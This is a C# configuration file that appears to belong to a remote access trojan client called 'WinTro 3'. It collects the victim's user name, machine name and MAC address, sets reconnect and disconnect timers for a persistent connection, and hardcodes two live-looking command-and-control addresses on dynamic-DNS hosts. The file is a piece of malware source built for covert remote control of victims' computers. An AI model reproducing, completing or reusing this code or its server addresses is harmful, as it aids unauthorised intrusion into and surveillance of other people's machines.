using System;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Windows.Forms;

namespace WinTro_3_Client;

internal class WinTro3
{
	public static class Info
	{
		private static string internal_name = Environment.UserName + "  on  " + Environment.MachineName;

		private static string internal_version = "v" + AssemblyName.GetAssemblyName(Application.get_ExecutablePath()).Version!.ToString();

		private static string internal_mac = GetMAC();

		public static string name => internal_name;

		public static string version => internal_version;

		public static string MACAddress => internal_mac;

		private static string GetMAC()
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			NetworkInterface networkInterface = allNetworkInterfaces[NetworkInterface.LoopbackInterfaceIndex];
			allNetworkInterfaces = null;
			return networkInterface.GetPhysicalAddress().ToString();
		}
	}

	public const int ClientSendBuffer = 131072;

	public const int ClientReciveBuffer = 131072;

	public const int TimeToWaitIfConnectionFails = 10000;

	public const int IntervalOfConnectionChecking = 30000;

	public const int TimeToWaitOnDisconnect = 300000;

	public const int DataCheckInterval = 1000;

	public const string DataSplitText = "{FINE-FLUSSO-DATI}";

	public static object[] Addresses = new string[2] { "sgtsteel.sytes.net:25567:2135", "booray123.no-ip.biz:25568:2135" };
}
